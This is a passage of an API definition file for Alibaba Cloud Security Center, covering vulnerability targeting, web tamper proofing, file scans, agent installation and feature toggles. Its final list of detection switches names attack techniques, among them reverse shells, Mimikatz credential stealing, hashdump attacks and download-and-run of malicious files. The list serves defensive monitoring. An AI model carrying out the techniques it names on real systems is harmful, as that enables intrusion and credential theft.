    *   **cms**: Web-CMS vulnerabilities
    *   **emg**: urgent vulnerabilities', example='{\\"vulType\\":\\"sys\\"}', position='Query'),
  target?: string(name='Target', description='The operation. The value of this parameter is in the JSON format and contains the following fields:

*   **target**: the UUID of the server.

*   **targetType**: the application scope of the operation. Set the value to uuid.

*   **flag**: the type of the operation. Valid values:

    *   **add**: select
    *   **del**: deselect', example='[{\\"target\\": \\"9cd5c684-7201-4de5-ad2c-cea89a5e****\\", \\"targetType\\": \\"uuid\\", \\"flag\\": \\"add\\"}]', position='Query'),
}

model ModifyVulTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='38597320-A990-5444-9A4C-7A1269610C2A'),
}

model ModifyVulTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetResponseBody(name='body'),
}

async function modifyVulTarget(request: ModifyVulTargetRequest): ModifyVulTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyVulTarget', 'POST', '/', 'json', false, 'json', request);
}

model ModifyVulTargetConfigRequest {
  config: string(name='Config', description='Specifies whether to enable vulnerability detection. Valid values:

*   **on**: yes
*   **off**: no', example='off', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.', example='inet-7c676676-06fa-442e-90fb-b802e5d6****', position='Query'),
}

model ModifyVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1FF908BA-ADD8-5138-8595-614C6E3C6658'),
}

model ModifyVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetConfigResponseBody(name='body'),
}

async function modifyVulTargetConfig(request: ModifyVulTargetConfigRequest): ModifyVulTargetConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyVulTargetConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyVulWhitelistTargetRequest {
  id: long(name='Id', description='The ID of the whitelist.

>  You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.', example='2533681', position='Query'),
  reason?: string(name='Reason', description='The reason why you add the server to the whitelist.', example='1221', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.75.150', position='Query'),
  targetInfo?: string(name='TargetInfo', description='The applicable scope of the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the type of the applicable scope. Valid values:

    *   **GroupId**: the ID of a server group
    *   **Uuid**: the UUID of a server

*   **uuids**: the UUIDs of servers

*   **groupIds**: the IDs of server groups

>  If you leave this parameter empty, all servers are added to the whitelist. If you set the **type** field to **GroupId**, you must also specify the **groupIds** field. If you set the **type** field to **Uuid**, you must also specify the **uuids** field.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}', position='Query'),
}

model ModifyVulWhitelistTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='896AC4F0-C881-502B-BFC7-4751C5E3DEAA'),
}

model ModifyVulWhitelistTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulWhitelistTargetResponseBody(name='body'),
}

async function modifyVulWhitelistTarget(request: ModifyVulWhitelistTargetRequest): ModifyVulWhitelistTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyVulWhitelistTarget', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockCreateConfigRequest {
  defenceMode: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='block', position='Query'),
  dir: string(name='Dir', description='The directory that you want to protect.', example='/home/admin/tomcat', position='Query'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/test', position='Query'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/apache.log', position='Query'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg', position='Query'),
  inclusiveFile?: string(name='InclusiveFile', description='The file for which you want to enable web tamper proofing.

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='/home/admin/test.log', position='Query'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='jpg', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  localBackupDir: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.', example='/usr/local/backup', position='Query'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified sub-directories, file types, and files in the protected directories.', example='whitelist', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.170.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server for which you want to add a directory to protect.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-12345****', position='Query'),
}

model ModifyWebLockCreateConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockCreateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockCreateConfigResponseBody(name='body'),
}

async function modifyWebLockCreateConfig(request: ModifyWebLockCreateConfigRequest): ModifyWebLockCreateConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockCreateConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockDeleteConfigRequest {
  id: int32(name='Id', description='The ID of the protected directory that you want to delete.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.', example='12', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server for which you want to delete the protected directory.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the UUIDs of servers.', example='7f7fe9a2-55de-4b9d-a37a-0d981d36****', position='Query'),
}

model ModifyWebLockDeleteConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='299D0992-271A-5750-ACEB-46D322862BFF'),
}

model ModifyWebLockDeleteConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockDeleteConfigResponseBody(name='body'),
}

/**
  * After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
  *
 */
async function modifyWebLockDeleteConfig(request: ModifyWebLockDeleteConfigRequest): ModifyWebLockDeleteConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockDeleteConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockProcessStatusRequest {
  dealAll?: int32(name='DealAll', description='Specifies whether to change the status of the process on multiple servers on which the process runs at the same time. Valid values:

*   **0**: no
*   **1**: yes', example='1', position='Query'),
  operateInfo?: string(name='OperateInfo', description='The parameters required to change the status of multiple processes at a time. The value is in the JSON format.', example='[{"processPath":"/etc/test1","uuid":"0c1714dc-f7a3-4265-8364-7aa3fce8****"},{"processPath":"/etc/test2","uuid":"1cc45e7d-7698-4b2c-89d8-e8cba407****"}]', position='Query'),
  processPath?: [ string ](name='ProcessPath', description='The paths to the processes.', position='Query'),
  status?: int32(name='Status', description='The status of the process. Valid values:

*   **0**: cancels adding the process to the process whitelist
*   **1**: adds the process to the process whitelist', example='1', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='bc8510e7-7327-4030-b75c-956e434d****', position='Query'),
}

model ModifyWebLockProcessStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6A540B52-2441-5493-902B-37376C412776'),
}

model ModifyWebLockProcessStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockProcessStatusResponseBody(name='body'),
}

async function modifyWebLockProcessStatus(request: ModifyWebLockProcessStatusRequest): ModifyWebLockProcessStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockProcessStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockStartRequest {
  defenceMode: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='block', position='Query'),
  dir: string(name='Dir', description='The directory for which you want to enable web tamper proofing. Separate multiple directories with commas (,).', example='/home/admin/tomcat', position='Query'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/java', position='Query'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/tomcat/localhost.log', position='Query'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg', position='Query'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='php', position='Query'),
  localBackupDir: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.\\
The directory format of a Linux server is different from that of a Windows server. You must enter the directory in the required format based on your operating system. Examples:

*   Linux server: /usr/local/aegis/bak
*   Windows server: C:\\Program Files (x86)\\Alibaba\\Aegis\\bak', example='/usr/local/backup', position='Query'),
  mode: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='whitelist', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server for which you want to enable web tamper proofing.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f89ca****', position='Query'),
}

model ModifyWebLockStartResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStartResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStartResponseBody(name='body'),
}

async function modifyWebLockStart(request: ModifyWebLockStartRequest): ModifyWebLockStartResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockStart', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.71.XX.XX', position='Query'),
  status: string(name='Status', description='Specifies whether to enable or disable web tamper proofing for the specified server. Valid values:

*   **on**: enables web tamper proofing
*   **off**: disables web tamper proofing

> After you disable web tamper proofing for the specified server, one quota is released.', example='on', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server for which you want to enable or disable web tamper proofing. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-1234567****', position='Query'),
}

model ModifyWebLockStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStatusResponseBody(name='body'),
}

async function modifyWebLockStatus(request: ModifyWebLockStatusRequest): ModifyWebLockStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockUnbindRequest {
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to disable web tamper proofing.

> You can call the [DescribeWebLockBindList](~~DescribeWebLockBindList~~) operation to query the UUIDs of servers.', example='8d217d3f-6999-43a6-a435-c7a6854180e9', position='Query'),
}

model ModifyWebLockUnbindResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F0A8A039-930D-5EC1-97C8-43F05776188A'),
}

model ModifyWebLockUnbindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUnbindResponseBody(name='body'),
}

async function modifyWebLockUnbind(request: ModifyWebLockUnbindRequest): ModifyWebLockUnbindResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockUnbind', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebLockUpdateConfigRequest {
  defenceMode: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='block', position='Query'),
  dir: string(name='Dir', description='The directory for which you want to enable web tamper proofing.', example='/home/admin/tomcat', position='Query'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/test', position='Query'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/apache.log', position='Query'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg', position='Query'),
  id: int32(name='Id', description='The ID of the protected directory for which you want to change the status of web tamper proofing.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.', example='312077', position='Query'),
  inclusiveFile?: string(name='InclusiveFile', description='The file for which you want to enable web tamper proofing.

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='/home/admin/test.log', position='Query'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='jpg', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  localBackupDir: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.\\
The directory format of a Linux server is different from that of a Windows server. You must enter the directory in the required format based on your operating system. Examples:

*   Linux server: /usr/local/aegis/bak
*   Windows server: C:\\Program Files (x86)\\Alibaba\\Aegis\\bak', example='/usr/local/backup', position='Query'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='blacklist', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='36.112.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server on which the protected directory is located.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****', position='Query'),
}

model ModifyWebLockUpdateConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockUpdateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUpdateConfigResponseBody(name='body'),
}

async function modifyWebLockUpdateConfig(request: ModifyWebLockUpdateConfigRequest): ModifyWebLockUpdateConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebLockUpdateConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyWebPathRequest {
  config?: string(name='Config', description='The configuration of the web directory. The value of this parameter is in the JSON format and contains the following fields:

*   **webPathType**: the type of the web directory
*   **webPath**: the web directory', example='{
      "webPathType": "customize",
      "webPath": "/root/www****"
}', position='Query'),
  target?: string(name='Target', description='The protected asset to which the web directory belongs. The value of this parameter is in the JSON format and contains the following fields:

*   **target**: the protected asset.
*   **targetType**: the type of the asset. Set the value to uuid.
*   **flag**: the type of the operation.', example='[{"target":"0186127a-d33e-4d0c-94fb-8f25f87bc69f","targetType":"uuid","flag":"add"}]', position='Query'),
  type?: string(name='Type', description='The type of the configuration item. Set the value to **web_path**.', example='web_path', position='Query'),
}

model ModifyWebPathResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='20623245-7E5E-52CA-9640-7502F119****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebPathResponseBody(name='body'),
}

async function modifyWebPath(request: ModifyWebPathRequest): ModifyWebPathResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyWebPath', 'POST', '/', 'json', false, 'json', request);
}

model OpenSensitiveFileScanRequest {
  switchOn?: string(name='SwitchOn', description='Specifies whether to enable or disable sensitive file scan. Valid values:

*   **on**: enables sensitive file scan
*   **off**: disables sensitive file scan', example='on', position='Query'),
}

model OpenSensitiveFileScanResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    switchOn?: string(name='SwitchOn', description='Indicates whether sensitive file scan is enabled or disabled. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
  }(name='Data', description='The data.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B4A4C081-7F06-5481-9323-02A5419B9423'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model OpenSensitiveFileScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OpenSensitiveFileScanResponseBody(name='body'),
}

async function openSensitiveFileScan(request: OpenSensitiveFileScanRequest): OpenSensitiveFileScanResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OpenSensitiveFileScan', 'POST', '/', 'json', false, 'json', request);
}

model OperateAgentClientInstallRequest {
  instanceIds?: string(name='InstanceIds', description='The IDs of the servers on which you want to install the Security Center agent. Separate multiple IDs with commas (,).

> : You must specify at least one of **InstanceIds** and **Uuids**. If you specify **InstanceIds**, you must also specify **Region** and **Os**.', example='i-uf6j8vq9l4r5ntht****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  os?: string(name='Os', description='The operating system of the servers. Valid values:

*   **linux**
*   **windows**', example='linux', position='Query'),
  region?: string(name='Region', description='The region where the servers reside. Valid values include the following regions:

*   cn-hangzhou: China (Hangzhou)
*   cn-beijing: China (Beijing)
*   cn-shanghai: China (Shanghai)
*   cn-zhangjiakou: China (Zhangjiakou)
*   cn-shenzhen: China (Shenzhen)', example='cn-hangzhou', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to install the Security Center agent. Separate multiple UUIDs with commas (,).

> You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='1587bedb-fdb4-48c4-9330-************', position='Query'),
}

model OperateAgentClientInstallResponseBody = {
  aegisCelintInstallResposeList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6j8vq9l4r5ntht****'),
      recordId?: long(name='RecordId', description='The ID of the installation task.', example='2856'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-****'),
    }
  ](name='AegisCelintInstallResposeList', description='An array that consists of the returned results.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE79B457-877C-51C6-AD72-0D34A025D***'),
}

model OperateAgentClientInstallResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateAgentClientInstallResponseBody(name='body'),
}

async function operateAgentClientInstall(request: OperateAgentClientInstallRequest): OperateAgentClientInstallResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateAgentClientInstall', 'POST', '/', 'json', false, 'json', request);
}

model OperateApplicationRequest {
  containerWebDefenseApplicationDTOS: [ 
    {
      clusterId: string(name='ClusterId', example='ceb68cc58234141828677e383bd21ff0c'),
      flag: string(name='Flag', example='add'),
      id?: long(name='Id', example='196'),
      tag: string(name='Tag', example='app:app-003'),
    }
  ](name='ContainerWebDefenseApplicationDTOS', position='Query'),
  ruleId: long(name='RuleId', example='300566', position='Query'),
}

model OperateApplicationResponseBody = {
  requestId?: string(name='RequestId', example='79B067A4-54EB-5560-B5C8-425ABEDC2784'),
}

model OperateApplicationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateApplicationResponseBody(name='body'),
}

async function operateApplication(request: OperateApplicationRequest): OperateApplicationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateApplication', 'POST', '/', 'json', false, 'json', request);
}

model OperateBucketScanTaskRequest {
  bucketName?: string(name='BucketName', example='iboxpublic****', position='Query'),
  operateCode?: int32(name='OperateCode', example='1', position='Query'),
}

model OperateBucketScanTaskResponseBody = {
  requestId?: string(name='RequestId', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
}

model OperateBucketScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateBucketScanTaskResponseBody(name='body'),
}

async function operateBucketScanTask(request: OperateBucketScanTaskRequest): OperateBucketScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateBucketScanTask', 'POST', '/', 'json', false, 'json', request);
}

model OperateCommonOverallConfigRequest {
  config: string(name='Config', description='Specifies whether to enable or disable the feature. Valid values:

*   **on**: enable
*   **off**: disable', example='on', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='223.79.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
